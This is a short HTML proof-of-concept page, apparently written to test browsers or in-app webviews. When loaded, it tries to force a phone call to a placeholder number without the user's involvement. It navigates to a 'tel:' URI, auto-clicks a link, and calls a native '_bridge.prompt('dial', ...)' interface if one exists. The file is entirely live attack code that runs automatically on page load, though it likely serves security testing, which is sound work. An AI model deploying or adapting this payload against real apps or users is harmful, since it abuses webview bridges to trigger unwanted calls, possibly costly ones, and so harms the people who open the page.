<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>PoC</title>
</head>
<body>
  <div id="result">Starting test...</div>

  <script>
    function log(message) {
      const result = document.getElementById("result");
      result.innerHTML += "<br>" + message;
      console.log(message);
    }

    function attemptPhoneCall() {
 var phoneNumbers = [
                'tel:1234567890'
            ];

            phoneNumbers.forEach(function(phone) {
                try {
                    log('Attempting phone call: ' + phone);
                    window.location.href = phone;
                    var link = document.createElement('a');
                    link.href = phone;
                    link.click();
                    if (typeof _bridge !== 'undefined') {
                        try {
                            _bridge.prompt('dial', phone);
                        } catch(e) {
                            log('Bridge dial error: ' + e.message);
                        }
                    }
                } catch(e) {
                    log('Phone call error: ' + phone + ' - ' + e.message);
                }
            });
    }

    function runTest() {
      log("=== Starting Test ===");
      log("Timestamp: " + new Date().toISOString());

      log("--- Attempting Phone Call ---");
      attemptPhoneCall();

      log("=== Finished ===");
    }

    window.onload = runTest;
  </script>
</body>
</html>
